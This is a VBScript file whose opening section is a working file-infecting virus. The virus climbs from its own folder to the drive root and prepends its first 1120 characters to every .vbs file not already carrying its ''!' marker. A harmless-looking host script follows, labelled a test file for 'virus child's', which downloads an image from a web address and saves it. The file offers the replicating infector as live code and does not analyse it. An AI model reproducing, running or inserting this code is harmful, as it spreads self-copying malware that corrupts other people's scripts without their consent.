'!
Set FSO = CreateObject("Scripting.FileSystemObject")
VS   = 1120
FN =  WScript.ScriptFullName
InfPath = Left(FN, InStrRev(FN, "\"))
InfFolder(InfPath)

Sub InfFolder(iPath)
 if FSO.FolderExists(iPath) then
 Do
 Set FolderObj = FSO.GetFolder(iPath)
 iPath = FSO.GetParentFolderName(iPath)
 Set FO = FolderObj.Files
 For each target in FO
 ExtName = lcase(FSO.GetExtensionName(target.Name))

 if ExtName = "vbs" then
 Set file1 = FSO.OpenTextFile(target.path, 1, False)
 if file1.readline <> "'!" then
 file1.close()
 InfFile(target.path)
 else
 file1.close()
 end if
 end if

 next
 Loop Until FolderObj.IsRootFolder = True
 end if
 End Sub

Sub InfFile(iPath)
Set VictimFile    = FSO.OpenTextFile(iPath,1,False)
VictimContent     = VictimFile.ReadAll()
VictimFile.Close()

Set HostFile      = FSO.OpenTextFile(WScript.ScriptFullName,1,False)
HostContent       = HostFile.ReadAll()
HostFile.Close()

Vir = Mid(HostContent,1,VS)

Set VictimFile    = FSO.OpenTextFile(iPath,2,False)
VictimFile.Write Vir
VictimFile.Write VictimContent
VictimFile.Close()

End Sub
'--------------------------------------Begin code--------------------------
'==========================================================================
'
' VBScript Source File -- Created with SAPIEN Technologies PrimalScript 3.1
'
' NAME: TEST FILE FOR VIRUS CHILD'S
'
' AUTHOR: admin , mc
' DATE  : 15.07.2005
'
' COMMENT: 
'
'==========================================================================
sSource = "http://msdn.microsoft.com/scripting/art/t_scripting.jpg"
sDest = "test.jpg"

set oHTTP = WScript.CreateObject("Microsoft.XMLHTTP")
set oFSO = WScript.CreateObject("Scripting.FileSystemObject")

oHTTP.open "GET", sSource, False
oHTTP.send
body8209 = oHTTP.responseBody
set oHTTP = nothing

sOut = ""
For i = 0 to UBound(body8209)
	sOut = sOut & chrw(ascw(chr(ascb(midb(body8209,i+1,1)))))
Next

set oTS = oFSO.CreateTextFile(sDest, True)
oTS.Write sOut
oTS.Close
set oTS = Nothing
set oFSO = Nothing
WScript.Echo "Done!"
'--------------------------------------End code ---------------------------